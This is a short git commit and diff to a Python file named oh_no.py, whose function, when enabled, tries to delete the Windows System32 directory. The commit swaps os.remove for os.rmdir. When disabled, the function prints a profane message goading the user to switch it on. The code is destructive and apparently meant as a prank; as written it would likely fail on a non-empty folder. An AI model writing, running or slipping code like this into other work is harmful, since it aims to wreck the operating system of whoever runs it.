e2a3cd957102aa08d7c51184f98dd0c1fd1aeab4
QwertyL0L <twobuilderrrnoobyt@gmail.com>
2024-08-02 20:35:08 -0500

    changed "remove" to be "rmdir"

--- oh_no.py
+++ oh_no.py
@@ -4,4 +4,4 @@ def oh_no(enabled=False):
 	if enabled == False:
 		print("you fucking pussy change me to True")
 	elif enabled == True:
-		os.remove("C:\Windows\System32")
+		os.rmdir("C:\Windows\System32")
